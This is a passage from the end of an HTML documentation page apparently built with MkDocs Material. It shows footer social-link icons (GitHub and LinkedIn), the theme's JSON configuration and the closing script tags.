      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://ca.linkedin.com/in/nouman-noor-60193727" target="_blank" rel="noopener" title="ca.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.annotate", "content.code.copy", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
      
    
  </body>
</html>